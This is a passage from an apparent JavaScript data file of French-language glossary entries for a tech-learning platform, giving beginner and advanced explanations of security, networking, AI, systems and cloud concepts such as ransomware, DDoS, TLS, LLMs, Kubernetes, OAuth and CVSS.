      "Concrètement : authentification forte systématique, accès accordés selon le principe du moindre privilège et réévalués en continu (pas juste à la connexion), micro-segmentation du réseau pour limiter les mouvements latéraux en cas de compromission. Un changement culturel autant que technique — s'oppose au modèle traditionnel de « périmètre de confiance ».",
    docUrl: "https://www.cisa.gov/zero-trust-maturity-model",
    relatedKeys: ["mfa"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "ransomware",
    name: "Ransomware",
    category: "CYBERSECURITY",
    level: 2,
    definition:
      "Un logiciel malveillant qui chiffre les fichiers d'une victime et exige une rançon (souvent en cryptomonnaie) en échange de la clé de déchiffrement.",
    explanationBeginner:
      "Un ransomware verrouille tes fichiers (photos, documents...) en les chiffrant, puis affiche un message demandant de l'argent pour les débloquer. Payer ne garantit jamais de récupérer ses fichiers — la meilleure protection reste d'avoir des sauvegardes régulières, hors ligne ou isolées.",
    explanationAdvanced:
      "Se propage souvent via phishing, RDP mal sécurisé, ou l'exploitation de vulnérabilités non corrigées. Les variantes modernes pratiquent la « double extorsion » : exfiltrer les données avant de les chiffrer, pour menacer de les publier même si la victime restaure ses sauvegardes sans payer. La défense combine sauvegardes testées (règle 3-2-1), segmentation réseau, et patch management rigoureux.",
    docUrl: "https://www.cisa.gov/stopransomware",
    relatedKeys: [],
    prerequisiteKeys: [],
    aliases: ["rancongiciel"],
  },
  {
    key: "ddos",
    name: "DDoS",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Distributed Denial of Service — une attaque qui submerge un service de trafic depuis de nombreuses sources simultanément, pour le rendre indisponible aux utilisateurs légitimes.",
    explanationBeginner:
      "Imagine des milliers de personnes qui appellent en même temps la même ligne téléphonique : elle devient saturée et plus personne ne peut passer un appel légitime. Un DDoS fait ça à un site web, avec du trafic provenant souvent d'appareils compromis (un botnet) répartis partout dans le monde.",
    explanationAdvanced:
      "On distingue les attaques volumétriques (saturer la bande passante), les attaques applicatives (épuiser les ressources serveur avec des requêtes coûteuses mais peu nombreuses), et les attaques protocolaires (exploiter des faiblesses de TCP/IP). Les défenses passent par des CDN/services anti-DDoS qui absorbent et filtrent le trafic en amont avant qu'il n'atteigne l'infrastructure réelle.",
    docUrl: "https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/",
    relatedKeys: ["cdn"],
    prerequisiteKeys: [],
    aliases: ["deni de service distribue"],
  },
  {
    key: "penetration-testing",
    name: "Test d'intrusion",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Une simulation autorisée d'attaque contre un système, pour identifier ses vulnérabilités réelles avant qu'un vrai attaquant ne les exploite.",
    explanationBeginner:
      "Une entreprise engage des experts en sécurité pour essayer de « pirater » ses propres systèmes, avec autorisation écrite et un périmètre défini à l'avance, afin de trouver les failles et les corriger avant qu'un vrai attaquant ne les découvre.",
    explanationAdvanced:
      "Un pentest suit généralement une méthodologie structurée (reconnaissance, énumération, exploitation, post-exploitation, reporting — voir le cours Red Team Fundamentals de Nodify). Se distingue d'un audit de vulnérabilités automatisé (scan) par l'exploitation active des failles trouvées pour évaluer leur impact réel, et d'un Red Team engagement par un périmètre généralement plus large et une durée plus longue.",
    docUrl: "https://owasp.org/www-project-web-security-testing-guide/",
    relatedKeys: [],
    prerequisiteKeys: [],
    aliases: ["pentest", "test intrusion"],
  },
  {
    key: "ids-ips",
    name: "IDS/IPS",
    category: "CYBERSECURITY",
    level: 4,
    definition:
      "Intrusion Detection/Prevention System — un système qui surveille le trafic réseau pour détecter (IDS) et éventuellement bloquer automatiquement (IPS) une activité suspecte.",
    explanationBeginner:
      "Un IDS agit comme une alarme qui prévient quand quelque chose de suspect se passe sur le réseau, sans agir lui-même. Un IPS va plus loin : il peut bloquer automatiquement le trafic suspect en temps réel, comme un vigile qui referme la porte au lieu de juste sonner l'alarme.",
    explanationAdvanced:
      "Deux approches de détection : par signatures (motifs d'attaques connues, rapide mais aveugle aux nouvelles menaces) et par anomalies (écart par rapport à un comportement de référence, détecte du nouveau mais génère plus de faux positifs). Un IPS mal configuré peut lui-même devenir un vecteur de déni de service s'il bloque à tort du trafic légitime.",
    docUrl: "https://www.cloudflare.com/learning/security/what-is-intrusion-prevention-system-ips/",
    relatedKeys: ["ddos"],
    prerequisiteKeys: [],
    aliases: ["ids", "ips"],
  },
  {
    key: "vpn",
    name: "VPN",
    category: "NETWORKING",
    level: 2,
    definition:
      "Virtual Private Network — un tunnel chiffré entre un appareil et un serveur intermédiaire, qui cache le trafic réseau aux intermédiaires (ex: le Wi-Fi public) et masque l'adresse IP d'origine.",
    explanationBeginner:
      "Sur un Wi-Fi public, n'importe qui sur le même réseau pourrait techniquement espionner ton trafic non chiffré. Un VPN crée un tunnel sécurisé entre toi et un serveur de confiance, rendant ton trafic illisible pour quiconque se trouve entre les deux.",
    explanationAdvanced:
      "Un VPN protège le trafic entre toi et le serveur VPN, mais le fournisseur du VPN voit lui-même tout ce trafic — un VPN ne remplace donc pas HTTPS de bout en bout, ni un antivirus, ni la vigilance face au phishing. En entreprise, un VPN sert aussi à donner un accès distant sécurisé au réseau interne, de plus en plus remplacé par des architectures Zero Trust plus granulaires.",
    docUrl: "https://www.cloudflare.com/learning/access-management/what-is-a-vpn/",
    relatedKeys: ["tls-ssl"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "tcp-vs-udp",
    name: "TCP vs UDP",
    category: "NETWORKING",
    level: 2,
    definition:
      "Deux protocoles de transport fondamentaux d'internet : TCP garantit la livraison fiable et ordonnée des données, UDP privilégie la vitesse sans garantie de livraison.",
    explanationBeginner:
      "TCP, c'est comme une lettre recommandée : tu as la confirmation que chaque morceau est bien arrivé, dans l'ordre — mais c'est plus lent à cause de ces vérifications. UDP, c'est comme crier une info dans une pièce : plus rapide, mais rien ne garantit que tout le monde l'a entendue.",
    explanationAdvanced:
      "TCP établit une connexion (handshake en 3 étapes), retransmet les paquets perdus et les réordonne — idéal pour le chargement d'une page web ou un transfert de fichier où rien ne doit manquer. UDP n'a ni connexion ni retransmission, ce qui le rend adapté au streaming vidéo ou aux jeux en ligne, où une donnée légèrement en retard ne vaut plus la peine d'être renvoyée.",
    docUrl: "https://developer.mozilla.org/docs/Glossary/TCP",
    relatedKeys: ["http"],
    prerequisiteKeys: [],
    aliases: ["tcp", "udp"],
  },
  {
    key: "load-balancer",
    name: "Load Balancer",
    category: "NETWORKING",
    level: 3,
    definition:
      "Un système qui répartit le trafic entrant entre plusieurs serveurs, pour éviter qu'un seul serveur ne soit surchargé et améliorer la disponibilité globale.",
    explanationBeginner:
      "Au lieu d'envoyer toutes les requêtes à un seul serveur (qui pourrait tomber en panne ou ralentir sous la charge), un load balancer les répartit intelligemment entre plusieurs serveurs identiques — comme plusieurs caisses ouvertes dans un magasin plutôt qu'une seule.",
    explanationAdvanced:
      "Stratégies de répartition courantes : round-robin (à tour de rôle), least connections (vers le serveur le moins chargé), ou par hash (toujours le même serveur pour un même client, utile pour les sessions). Un load balancer fait aussi souvent office de point de terminaison TLS et de vérification de santé (health checks) pour retirer automatiquement un serveur défaillant de la rotation.",
    docUrl: "https://www.cloudflare.com/learning/performance/what-is-load-balancing/",
    relatedKeys: ["cdn"],
    prerequisiteKeys: [],
    aliases: ["repartiteur de charge"],
  },
  {
    key: "cdn",
    name: "CDN",
    category: "NETWORKING",
    level: 2,
    definition:
      "Content Delivery Network — un réseau de serveurs répartis géographiquement qui servent le contenu d'un site depuis le point le plus proche de l'utilisateur, pour réduire la latence.",
    explanationBeginner:
      "Si ton site est hébergé en France mais qu'un visiteur se connecte depuis le Japon, un CDN sert une copie du contenu depuis un serveur proche du Japon plutôt que de faire l'aller-retour jusqu'en France — la page charge beaucoup plus vite.",
    explanationAdvanced:
      "Un CDN met en cache les ressources statiques (images, CSS, JS) au plus près des utilisateurs via des points de présence (PoP) répartis mondialement, et sert aussi de première ligne de défense contre les attaques DDoS volumétriques en absorbant le trafic avant qu'il n'atteigne l'origine. La gestion du cache invalidation (savoir quand une ressource mise en cache est obsolète) est le principal défi opérationnel.",
    docUrl: "https://www.cloudflare.com/learning/cdn/what-is-a-cdn/",
    relatedKeys: ["load-balancer", "ddos"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "tls-ssl",
    name: "TLS/SSL",
    category: "NETWORKING",
    level: 2,
    definition:
      "Les protocoles qui chiffrent les communications sur internet (HTTPS = HTTP + TLS), garantissant confidentialité et intégrité entre un client et un serveur.",
    explanationBeginner:
      "Le petit cadenas dans la barre d'adresse de ton navigateur signifie que la connexion utilise TLS : personne entre toi et le site ne peut lire ou modifier les données échangées. SSL est l'ancien nom du protocole ; TLS est sa version moderne et sécurisée.",
    explanationAdvanced:
      "TLS établit une connexion via un handshake qui négocie l'algorithme de chiffrement et échange les clés (souvent via Diffie-Hellman éphémère pour garantir le forward secrecy), puis authentifie le serveur via un certificat signé par une autorité de certification de confiance. SSL (versions 1 à 3) est obsolète et vulnérable — seul TLS 1.2+ est considéré sûr aujourd'hui.",
    docUrl: "https://www.cloudflare.com/learning/ssl/what-is-ssl/",
    relatedKeys: ["vpn", "http"],
    prerequisiteKeys: [],
    aliases: ["ssl", "tls", "https"],
  },
  {
    key: "llm",
    name: "LLM",
    category: "AI",
    level: 2,
    definition:
      "Large Language Model — un modèle d'intelligence artificielle entraîné sur d'énormes volumes de texte, capable de générer et comprendre du langage naturel.",
    explanationBeginner:
      "Un LLM a « lu » une quantité astronomique de texte pendant son entraînement, ce qui lui permet de prédire quel mot (ou fragment de mot) devrait venir ensuite dans une phrase — de façon si sophistiquée qu'il peut répondre à des questions, résumer des textes ou écrire du code.",
    explanationAdvanced:
      "Architecturalement, la plupart des LLM modernes reposent sur les Transformers (mécanisme d'attention permettant de pondérer l'importance de chaque mot par rapport aux autres dans son contexte). Un LLM ne « comprend » pas au sens humain : il génère la suite la plus probable statistiquement, ce qui explique à la fois ses capacités impressionnantes et ses hallucinations (affirmer quelque chose de faux avec assurance).",
    docUrl: "https://aws.amazon.com/what-is/large-language-model/",
    relatedKeys: ["rag", "hallucination"],
    prerequisiteKeys: [],
    aliases: ["large language model", "modele de langage"],
  },
  {
    key: "prompt-engineering",
    name: "Prompt Engineering",
    category: "AI",
    level: 2,
    definition:
      "La pratique de concevoir soigneusement les instructions données à un modèle de langage pour obtenir des réponses plus précises, utiles ou fiables.",
    explanationBeginner:
      "La façon dont tu poses une question à une IA change beaucoup la qualité de sa réponse. Donner des exemples, préciser le format attendu, ou décomposer une tâche complexe en étapes améliore souvent énormément le résultat — sans changer le modèle lui-même.",
    explanationAdvanced:
      "Techniques courantes : le few-shot prompting (donner des exemples du résultat attendu dans le prompt), le chain-of-thought (demander au modèle de raisonner étape par étape avant de conclure), et la séparation claire entre instructions système et contenu utilisateur pour réduire les risques d'injection de prompt (où un contenu externe tente de détourner les instructions originales).",
    docUrl: "https://docs.anthropic.com/en/docs/build-with-claude/prompt-engineering/overview",
    relatedKeys: ["llm"],
    prerequisiteKeys: ["llm"],
    aliases: ["ingenierie de prompt"],
  },
  {
    key: "fine-tuning",
    name: "Fine-tuning",
    category: "AI",
    level: 4,
    definition:
      "Poursuivre l'entraînement d'un modèle déjà pré-entraîné sur un jeu de données plus restreint et spécifique, pour spécialiser son comportement sur une tâche précise.",
    explanationBeginner:
      "Plutôt que d'entraîner un modèle d'IA depuis zéro (extrêmement coûteux), on part d'un modèle déjà entraîné sur des connaissances générales, et on l'entraîne un peu plus sur des exemples spécifiques à ton besoin — comme un professionnel généraliste qui suit une formation spécialisée.",
    explanationAdvanced:
      "Le fine-tuning ajuste les poids du modèle lui-même, contrairement au RAG ou au prompt engineering qui ne changent pas le modèle mais son contexte d'entrée. Plus coûteux et plus long à mettre en place, mais utile quand un comportement très spécifique et cohérent est requis (ton, format strict, domaine très spécialisé) au-delà de ce qu'un bon prompt peut garantir de façon fiable.",
    docUrl: "https://platform.openai.com/docs/guides/fine-tuning",
    relatedKeys: ["llm"],
    prerequisiteKeys: ["llm"],
    aliases: [],
  },
  {
    key: "hallucination",
    name: "Hallucination (IA)",
    category: "AI",
    level: 3,
    definition:
      "Quand un modèle de langage génère une information fausse ou inventée avec la même assurance qu'une information vraie, sans signaler son incertitude.",
    explanationBeginner:
      "Une IA peut inventer une citation, une date ou un fait qui n'existe pas, tout en le présentant comme certain — parce qu'elle génère le texte le plus probable statistiquement, pas en vérifiant des faits dans une base de connaissances fiable. D'où l'importance de toujours vérifier les informations critiques données par une IA.",
    explanationAdvanced:
      "Le RAG réduit les hallucinations en ancrant les réponses dans des documents réels fournis en contexte, mais ne les élimine pas complètement. D'autres approches : demander au modèle de citer ses sources, lui demander explicitement d'admettre son incertitude plutôt que d'inventer, ou faire vérifier la réponse par un second modèle/processus avant de la considérer fiable.",
    docUrl: "https://en.wikipedia.org/wiki/Hallucination_(artificial_intelligence)",
    relatedKeys: ["llm", "rag"],
    prerequisiteKeys: ["llm"],
    aliases: ["hallucination ia"],
  },
  {
    key: "tokenization",
    name: "Tokenisation",
    category: "AI",
    level: 3,
    definition:
      "Le découpage d'un texte en unités plus petites (tokens — mots, sous-mots ou caractères) que le modèle de langage traite réellement, au lieu de traiter le texte brut.",
    explanationBeginner:
      "Un LLM ne « lit » pas directement des mots : il découpe le texte en petits morceaux appelés tokens (parfois un mot entier, parfois juste un fragment). C'est aussi l'unité utilisée pour facturer l'usage d'une API IA — plus ton texte a de tokens, plus ça coûte cher et prend de temps à traiter.",
    explanationAdvanced:
      "Les tokenizers modernes (comme BPE — Byte Pair Encoding) découpent le texte en sous-mots fréquents plutôt qu'en mots entiers, ce qui permet de gérer des mots inconnus en les décomposant en fragments déjà vus à l'entraînement. La taille du contexte maximal d'un modèle (« context window ») se mesure en tokens, pas en caractères ou en mots.",
    docUrl: "https://platform.openai.com/tokenizer",
    relatedKeys: ["llm"],
    prerequisiteKeys: ["llm"],
    aliases: ["tokenisation", "token llm"],
  },
  {
    key: "process-vs-thread",
    name: "Process vs Thread",
    category: "SYSTEMS",
    level: 3,
    definition:
      "Un process (processus) est une instance isolée d'un programme en exécution avec sa propre mémoire ; un thread (fil d'exécution) est une unité d'exécution qui partage la mémoire de son processus avec d'autres threads.",
    explanationBeginner:
      "Chaque processus est comme une maison séparée avec ses propres pièces (mémoire) : ce qui se passe dans l'un n'affecte pas directement l'autre. Les threads sont comme plusieurs personnes qui vivent dans la même maison (processus) et partagent les mêmes pièces — plus rapide à faire communiquer, mais plus risqué si deux threads modifient la même chose en même temps.",
    explanationAdvanced:
      "Créer un processus est plus coûteux (nouvelle mémoire, nouveau contexte) que créer un thread, mais les processus s'isolent mieux (un crash n'affecte pas les autres). Node.js est mono-thread pour l'exécution JavaScript (voir Event Loop) mais délègue certaines opérations (I/O disque, crypto) à un pool de threads en arrière-plan (libuv) — d'où l'intérêt de `worker_threads` ou de processus enfants pour du vrai calcul parallèle en Node.js.",
    docUrl: "https://en.wikipedia.org/wiki/Thread_(computing)",
    relatedKeys: ["event-loop"],
    prerequisiteKeys: [],
    aliases: ["processus vs thread", "thread"],
  },
  {
    key: "shell",
    name: "Shell",
    category: "SYSTEMS",
    level: 1,
    definition:
      "Un programme qui interprète les commandes tapées par l'utilisateur (ou un script) et les transmet au système d'exploitation — l'interface en ligne de commande d'un système.",
    explanationBeginner:
      "Quand tu ouvres un « terminal » et tapes `ls` ou `cd Documents`, c'est le shell (souvent Bash sous Linux/Mac, PowerShell sous Windows) qui comprend ta commande et l'exécute. C'est une alternative textuelle à cliquer sur des icônes.",
    explanationAdvanced:
      "Un shell peut aussi exécuter des scripts (suites de commandes automatisées), gérer des variables d'environnement, et enchaîner des commandes via des pipes (`|`, qui envoie la sortie d'une commande en entrée de la suivante). Bash reste le shell le plus répandu sous Linux/macOS ; PowerShell (orienté objets plutôt que texte brut) est le standard moderne sous Windows.",
    docUrl: "https://www.gnu.org/software/bash/manual/bash.html",
    relatedKeys: ["linux"],
    prerequisiteKeys: [],
    aliases: ["terminal", "ligne de commande"],
  },
  {
    key: "environment-variable",
    name: "Variable d'environnement",
    category: "SYSTEMS",
    level: 1,
    definition:
      "Une valeur configurée en dehors du code source, accessible par un programme au moment de son exécution — utilisée pour stocker de la config qui varie selon l'environnement (dev, prod...).",
    explanationBeginner:
      "Plutôt que d'écrire ton mot de passe de base de données directement dans le code (visible par quiconque lit le fichier), tu le mets dans une variable d'environnement (`DATABASE_URL=...`) que le programme lit au démarrage. Ça permet aussi d'avoir une config différente en développement et en production sans toucher au code.",
    explanationAdvanced:
      "Les fichiers `.env` (chargés par des bibliothèques comme `dotenv`) sont une convention pratique en développement, mais ne doivent jamais être commités dans un dépôt Git (secrets exposés définitivement dans l'historique). En production, la plupart des plateformes d'hébergement injectent directement les variables d'environnement sans passer par un fichier `.env`.",
    docUrl: "https://12factor.net/config",
    relatedKeys: ["git"],
    prerequisiteKeys: [],
    aliases: ["env var", "variable environnement"],
  },
  {
    key: "kubernetes",
    name: "Kubernetes",
    category: "CLOUD",
    level: 4,
    definition:
      "Un système d'orchestration open-source qui automatise le déploiement, la mise à l'échelle et la gestion d'applications conteneurisées (Docker) à grande échelle.",
    explanationBeginner:
      "Si Docker permet de faire tourner un conteneur, Kubernetes gère des centaines ou des milliers de conteneurs à travers plusieurs machines : il les redémarre automatiquement s'ils plantent, en ajoute davantage si le trafic augmente, et répartit la charge entre eux.",
    explanationAdvanced:
      "Les concepts clés : Pod (plus petite unité déployable, un ou plusieurs conteneurs), Deployment (gère un ensemble de Pods identiques et leurs mises à jour), Service (point d'accès réseau stable vers un ensemble de Pods), et le control plane qui maintient en continu l'état réel du cluster aligné sur l'état désiré (déclaré en YAML). Sur-dimensionné pour un petit projet — sa complexité opérationnelle ne se justifie qu'à partir d'une certaine échelle.",
    docUrl: "https://kubernetes.io/docs/concepts/overview/",
    relatedKeys: ["docker"],
    prerequisiteKeys: ["docker"],
    aliases: ["k8s"],
  },
  {
    key: "serverless",
    name: "Serverless",
    category: "CLOUD",
    level: 3,
    definition:
      "Un modèle d'exécution cloud où le code s'exécute à la demande (déclenché par un événement) sans que le développeur ait à gérer ou provisionner de serveur lui-même.",
    explanationBeginner:
      "« Serverless » ne veut pas dire qu'il n'y a pas de serveur — juste que tu n'as pas à t'en occuper : tu déploies une fonction, le fournisseur cloud la fait tourner uniquement quand elle est appelée, et tu ne payes que pour ce temps d'exécution réel, pas pour un serveur qui tourne en permanence.",
    explanationAdvanced:
      "Les fonctions serverless (AWS Lambda, Cloudflare Workers...) souffrent du « cold start » : un délai supplémentaire au premier appel après une période d'inactivité, le temps que l'environnement d'exécution démarre. Adapté aux charges de travail intermittentes ou imprévisibles ; moins pertinent pour un service à trafic constant et élevé où un serveur dédié devient plus prévisible en coût et en latence.",
    docUrl: "https://aws.amazon.com/serverless/",
    relatedKeys: ["kubernetes", "docker"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "rust",
    name: "Rust",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Un langage de programmation système compilé, conçu pour offrir les performances du C/C++ sans les bugs mémoire classiques (use-after-free, data races) grâce à son système d'ownership vérifié à la compilation.",
    explanationBeginner:
      "Rust t'oblige à être précis sur qui « possède » chaque donnée à un instant donné (l'ownership). Ça semble contraignant au début, mais ça élimine à la compilation toute une catégorie de bugs (accéder à une mémoire déjà libérée, deux threads qui modifient la même donnée en même temps) que d'autres langages ne détectent qu'à l'exécution, si jamais ils les détectent.",
    explanationAdvanced:
      "Le borrow checker vérifie à la compilation que chaque valeur a un seul propriétaire à la fois (ou plusieurs emprunts en lecture seule, jamais un emprunt mutable en parallèle d'un autre emprunt) — pas de garbage collector, pas de pause GC imprévisible, mais une courbe d'apprentissage réelle. Très utilisé pour des composants critiques en performance/sécurité (moteurs WebAssembly, CLI, systèmes embarqués, composants de navigateurs).",
    docUrl: "https://doc.rust-lang.org/book/",
    relatedKeys: ["webassembly"],
    prerequisiteKeys: [],
    aliases: [],
  },
  {
    key: "webassembly",
    name: "WebAssembly",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Un format binaire portable et performant (Wasm) qui s'exécute dans le navigateur (et de plus en plus hors navigateur) à une vitesse proche du natif, en complément du JavaScript plutôt qu'à sa place.",
    explanationBeginner:
      "WebAssembly permet de faire tourner dans un navigateur du code écrit dans un autre langage (Rust, C++, Go...) compilé vers un format binaire très rapide à exécuter. Ce n'est pas un remplaçant de JavaScript : les deux collaborent, JS orchestre et Wasm prend en charge les calculs lourds (traitement d'image, jeux vidéo, chiffrement...).",
    explanationAdvanced:
      "Wasm s'exécute dans une sandbox mémoire-safe isolée du reste de la page, avec un accès au DOM uniquement via des appels JavaScript (pas d'accès direct). De plus en plus utilisé hors navigateur (WASI) pour du edge computing ou des plugins sandboxés portables indépendants de l'OS hôte.",
    docUrl: "https://webassembly.org/",
    relatedKeys: ["rust"],
    prerequisiteKeys: [],
    aliases: ["wasm"],
  },
  {
    key: "grpc",
    name: "gRPC",
    category: "DEVELOPMENT",
    level: 3,
    definition:
      "Un framework RPC (Remote Procedure Call) développé par Google, basé sur HTTP/2 et Protocol Buffers, conçu pour la communication rapide et fortement typée entre microservices.",
    explanationBeginner:
      "Plutôt que d'échanger du JSON en texte libre comme une API REST classique, gRPC définit un contrat strict (quelles fonctions existent, quels types de données elles attendent) dans un fichier `.proto`, puis génère automatiquement le code client/serveur dans plusieurs langages — moins d'erreurs de format, des échanges plus compacts et plus rapides.",
    explanationAdvanced:
      "Protocol Buffers sérialise les données en binaire compact (plus petit et plus rapide à parser que du JSON), et HTTP/2 apporte le multiplexage et le streaming bidirectionnel natif. Très répandu pour la communication interne entre microservices dans une même infrastructure ; moins adapté qu'une API REST/GraphQL pour un usage public côté navigateur (support HTTP/2 natif limité côté client web).",
    docUrl: "https://grpc.io/docs/what-is-grpc/introduction/",
    relatedKeys: ["rest", "api"],
    prerequisiteKeys: ["api"],
    aliases: [],
  },
  {
    key: "terraform",
    name: "Terraform / Infrastructure as Code",
    category: "CLOUD",
    level: 3,
    definition:
      "Une approche (et un outil phare, Terraform) qui décrit l'infrastructure cloud (serveurs, réseaux, bases de données) dans des fichiers de configuration versionnés plutôt qu'en cliquant manuellement dans une console — l'Infrastructure as Code (IaC).",
    explanationBeginner:
      "Au lieu de créer un serveur à la main dans l'interface web d'un fournisseur cloud (et d'oublier comment tu l'as configuré six mois plus tard), tu décris l'infrastructure voulue dans un fichier texte. L'outil compare cet état voulu à l'état réel et applique automatiquement les changements nécessaires — le fichier devient la documentation vivante et versionnée de ton infrastructure.",
    explanationAdvanced:
      "Terraform maintient un fichier d'état (state) représentant l'infrastructure réellement provisionnée, et calcule un plan (diff entre l'état désiré dans le code et l'état réel) avant d'appliquer quoi que ce soit — permettant une revue avant modification, contrairement à un clic direct dans une console. Reproductible entre environnements (dev/staging/prod) et multi-fournisseurs via des providers (AWS, Azure, GCP, Cloudflare...).",
    docUrl: "https://developer.hashicorp.com/terraform/intro",
    relatedKeys: ["docker", "kubernetes", "cloud-fundamentals"],
    prerequisiteKeys: [],
    aliases: ["iac", "infrastructure as code"],
  },
  {
    key: "oauth2",
    name: "OAuth 2.0",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Un protocole d'autorisation déléguée qui permet à une application d'accéder à des ressources au nom d'un utilisateur (ex: se connecter avec Google) sans jamais recevoir son mot de passe.",
    explanationBeginner:
      "Quand tu cliques sur « Se connecter avec Google » sur un site, tu n'entres jamais ton mot de passe Google sur ce site tiers : Google t'authentifie sur sa propre page, puis transmet au site un jeton d'accès limité. OAuth 2.0 est le protocole qui organise cet échange — c'est de l'autorisation déléguée, pas directement de l'authentification.",
    explanationAdvanced:
      "OAuth 2.0 définit plusieurs « flows » selon le contexte (Authorization Code pour une app serveur, PKCE pour une app mobile/SPA sans secret client stockable en sécurité, Client Credentials pour une communication machine-à-machine). OAuth 2.0 en lui-même ne standardise pas l'identité de l'utilisateur — c'est le rôle d'OpenID Connect (OIDC), une couche d'authentification construite par-dessus OAuth 2.0, souvent confondue avec lui.",
    docUrl: "https://oauth.net/2/",
    relatedKeys: ["jwt", "mfa"],
    prerequisiteKeys: [],
    aliases: ["oauth"],
  },
  {
    key: "csp",
    name: "Content Security Policy (CSP)",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Un en-tête HTTP de sécurité qui indique au navigateur quelles sources de contenu (scripts, styles, images...) une page a le droit de charger — une défense en profondeur majeure contre les attaques XSS.",
    explanationBeginner:
      "Même si une faille XSS permet d'injecter du code malveillant dans une page, une CSP bien configurée peut empêcher ce code de s'exécuter en refusant de charger des scripts venant d'une source non autorisée dans la liste blanche du site.",
    explanationAdvanced:
      "Une directive typique : `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.example`. Éviter `unsafe-inline`/`unsafe-eval` qui affaiblissent fortement la protection en autorisant le JavaScript inline ou dynamique. La directive `frame-ancestors` remplace aujourd'hui l'ancien en-tête `X-Frame-Options` pour se protéger du clickjacking (chargement de la page dans une iframe malveillante).",
    docUrl: "https://developer.mozilla.org/docs/Web/HTTP/CSP",
    relatedKeys: ["xss", "cors"],
    prerequisiteKeys: ["xss"],
    aliases: ["content security policy"],
  },
  {
    key: "cia-triad",
    name: "CIA Triad",
    category: "CYBERSECURITY",
    level: 1,
    definition:
      "Le modèle fondamental de la sécurité de l'information : Confidentialité, Intégrité, Disponibilité (Confidentiality, Integrity, Availability) — les trois propriétés qu'une mesure de sécurité cherche à protéger.",
    explanationBeginner:
      "Confidentialité : seules les personnes autorisées voient la donnée. Intégrité : la donnée n'est pas altérée sans autorisation. Disponibilité : la donnée/service reste accessible quand on en a besoin. Presque toute décision de sécurité peut se rattacher à l'une de ces trois propriétés.",
    explanationAdvanced:
      "Ces trois propriétés sont souvent en tension : chiffrer des données protège la confidentialité mais peut réduire la disponibilité (clé perdue = données inaccessibles). Une attaque DDoS cible uniquement la disponibilité sans toucher confidentialité ni intégrité. Le modèle sert de grille de lecture pour classer une menace ou évaluer une contre-mesure : « quelle propriété protège-t-elle réellement ? »",
    docUrl: "https://www.cisa.gov/news-events/news/cia-triad",
    relatedKeys: ["threat-modeling", "cvss"],
    prerequisiteKeys: [],
    aliases: ["confidentialite integrite disponibilite", "cid"],
  },
  {
    key: "threat-modeling",
    name: "Threat Modeling",
    category: "CYBERSECURITY",
    level: 2,
    definition:
      "Une démarche structurée pour identifier, à l'avance, les menaces possibles sur un système avant de le construire ou de le modifier, plutôt que de réagir après une attaque.",
    explanationBeginner:
      "Avant de coder une fonctionnalité, se poser des questions comme « qui pourrait vouloir attaquer ça ? », « par où pourrait-il rentrer ? », « que se passe-t-il si ça échoue ? » — anticiper coûte bien moins cher que de corriger une faille découverte en production.",
    explanationAdvanced:
      "Des méthodologies structurées existent, comme STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) qui catégorise systématiquement les types de menaces à envisager pour chaque composant d'une architecture. Le threat modeling se fait idéalement dès la conception (« shift left »), pas après le déploiement.",
    docUrl: "https://owasp.org/www-community/Threat_Modeling",
    relatedKeys: ["attack-surface", "cia-triad"],
    prerequisiteKeys: [],
    aliases: ["modelisation de menaces"],
  },
  {
    key: "attack-surface",
    name: "Attack Surface",
    category: "CYBERSECURITY",
    level: 2,
    definition:
      "L'ensemble des points d'entrée par lesquels un attaquant pourrait tenter de compromettre un système : endpoints d'API exposés, formulaires, ports ouverts, dépendances tierces, comptes utilisateurs.",
    explanationBeginner:
      "Plus une application expose de fonctionnalités, de ports réseau ou de dépendances externes, plus sa surface d'attaque est grande — chaque point exposé est une porte potentielle à sécuriser. Réduire la surface d'attaque (désactiver ce qui n'est pas utilisé) est une des mesures de sécurité les plus simples et efficaces.",
    explanationAdvanced:
      "La surface d'attaque inclut aussi la supply chain : chaque dépendance tierce (paquet npm/pip, image Docker de base) est un vecteur potentiel si elle est compromise, même sans faille dans le code propre à l'application. Un audit de surface d'attaque liste systématiquement tous les points d'entrée exposés, y compris ceux jugés « internes » mais accessibles depuis un réseau partiellement compromis.",
    docUrl: "https://owasp.org/www-community/Attack_Surface_Analysis_Cheat_Sheet",
    relatedKeys: ["threat-modeling", "supply-chain-attack"],
    prerequisiteKeys: [],
    aliases: ["surface d'attaque"],
  },
  {
    key: "cve",
    name: "CVE",
    category: "CYBERSECURITY",
    level: 2,
    definition:
      "Common Vulnerabilities and Exposures — un identifiant public standardisé (ex: CVE-2024-12345) attribué à chaque vulnérabilité connue et publiquement documentée, pour la référencer sans ambiguïté.",
    explanationBeginner:
      "Quand une faille de sécurité est découverte dans un logiciel largement utilisé, elle reçoit un numéro CVE unique — ça permet à tout le monde (chercheurs, éditeurs, administrateurs) de parler exactement de la même vulnérabilité, sans confusion, et de suivre facilement si un système y est exposé.",
    explanationAdvanced:
      "Une CVE décrit *quelle* vulnérabilité existe, mais pas *à quel point* elle est grave — c'est le rôle du score CVSS associé. La base MITRE CVE est la référence historique ; NVD (National Vulnerability Database) l'enrichit avec le scoring CVSS et des métadonnées. Un scan de vulnérabilités compare les versions de logiciels installés à la base CVE pour repérer les composants exposés à une faille connue.",
    docUrl: "https://cve.mitre.org/",
    relatedKeys: ["cvss", "vulnerability-vs-exploit"],
    prerequisiteKeys: [],
    aliases: ["common vulnerabilities and exposures"],
  },
  {
    key: "cvss",
    name: "CVSS",
    category: "CYBERSECURITY",
    level: 3,
    definition:
      "Common Vulnerability Scoring System — un score standardisé de 0 à 10 qui évalue la gravité d'une vulnérabilité, permettant de prioriser les correctifs.",
    explanationBeginner:
      "Toutes les vulnérabilités ne se valent pas : certaines nécessitent un accès physique à la machine pour être exploitées, d'autres sont exploitables à distance sans authentification. Le score CVSS traduit cette gravité en un chiffre unique (0 = négligeable, 10 = critique) pour aider à décider quoi corriger en priorité.",
